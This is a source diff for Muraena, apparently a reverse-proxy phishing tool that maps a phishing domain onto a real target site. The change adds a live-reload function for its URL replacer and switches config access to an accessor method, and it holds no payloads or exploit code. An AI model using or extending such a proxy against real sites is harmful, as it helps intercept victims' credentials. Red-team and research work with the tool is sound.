@@ -72,11 +72,31 @@ func (server *tlsServer) serveTLS(sslkeylog string) (err error) {
 
 var replacer *Replacer
 
+// CurrentReplacer returns the package-level replacer currently in use by the
+// proxy. It is primarily meant for tests and diagnostics that need to assert
+// the live replacer was rebuilt (e.g. after a runtime config PATCH). It may
+// be nil if neither Run nor RefreshReplacer has been called yet.
+func CurrentReplacer() *Replacer {
+	return replacer
+}
+
+// RefreshReplacer rebuilds the package-level replacer from the current
+// session configuration. Call this after an origins/transform config swap
+// so the changes take effect live, without restarting the proxy.
+func RefreshReplacer(sess *session.Session) error {
+	r := &Replacer{}
+	if err := r.Init(sess); err != nil {
+		return err
+	}
+	replacer = r
+	return nil
+}
+
 func Run(sess *session.Session) {
 
 	// Load the replacer
 	replacer = &Replacer{}
-	if err := replacer.Init(*sess); err != nil {
+	if err := replacer.Init(sess); err != nil {
 		log.Fatal(err.Error())
 	}
 
@@ -93,7 +113,7 @@ func Run(sess *session.Session) {
 		}()
 
 		// TODO: Configure properly middlewares.
-		if sess.Config.Watchdog.Enabled {
+		if sess.Config().Watchdog.Enabled {
 			m, err := sess.Module("watchdog")
 			if err != nil {
 				log.Error("%s", err)
@@ -112,15 +132,15 @@ func Run(sess *session.Session) {
 		s.HandleFood(response, request)
 	})
 
-	listeningAddress := fmt.Sprintf(`%s:%d`, sess.Config.Proxy.IP, sess.Config.Proxy.Port)
-	netListener, err := net.Listen(sess.Config.Proxy.Listener, listeningAddress)
+	listeningAddress := fmt.Sprintf(`%s:%d`, sess.Config().Proxy.IP, sess.Config().Proxy.Port)
+	netListener, err := net.Listen(sess.Config().Proxy.Listener, listeningAddress)
 	if core.IsError(err) {
 		log.Fatal("%s", err)
 	}
 
 	muraena := &muraenaServer{NetListener: netListener}
 
-	lline := fmt.Sprintf("Muraena is alive on %s \n[ %s ] ==> [ %s ]", tui.Green(listeningAddress), tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
+	lline := fmt.Sprintf("Muraena is alive on %s \n[ %s ] ==> [ %s ]", tui.Green(listeningAddress), tui.Yellow(sess.Config().Proxy.Phishing), tui.Green(sess.Config().Proxy.Target))
 	log.Info(lline)
 
 	if *sess.Options.Proxy {
@@ -140,7 +160,7 @@ func Run(sess *session.Session) {
 		}
 	}
 
-	if sess.Config.TLS.Enabled == false {
+	if sess.Config().TLS.Enabled == false {
 		// HTTP only
 		if err := muraena.Serve(muraena.NetListener); core.IsError(err) {
 			log.Fatal("Error binding Muraena on HTTP: %s", err)
@@ -148,14 +168,14 @@ func Run(sess *session.Session) {
 
 	} else {
 		// HTTPS
-		if sess.Config.Proxy.HTTPtoHTTPS.Enabled {
+		if sess.Config().Proxy.HTTPtoHTTPS.Enabled {
 			// redirect HTTP > HTTPS
-			newNetListener, err := net.Listen(sess.Config.Proxy.Listener, fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.HTTPtoHTTPS.HTTPport))
+			newNetListener, err := net.Listen(sess.Config().Proxy.Listener, fmt.Sprintf("%s:%d", sess.Config().Proxy.IP, sess.Config().Proxy.HTTPtoHTTPS.HTTPport))
 			if core.IsError(err) {
 				log.Fatal("%s", err)
 			}
 
-			server := &http.Server{Handler: RedirectToHTTPS(sess.Config.Proxy.Port)}
+			server := &http.Server{Handler: RedirectToHTTPS(sess.Config().Proxy.Port)}
 			go func() {
 				err := server.Serve(newNetListener)
 				if err != nil {
@@ -165,7 +185,7 @@ func Run(sess *session.Session) {
 		}
 
 		// Attach TLS configurations to muraena server
-		cTLS := sess.Config.TLS
+		cTLS := sess.Config().TLS
 		tlsServer := &tlsServer{
 			muraenaServer: muraena,
 			Cert:          cTLS.CertificateContent,
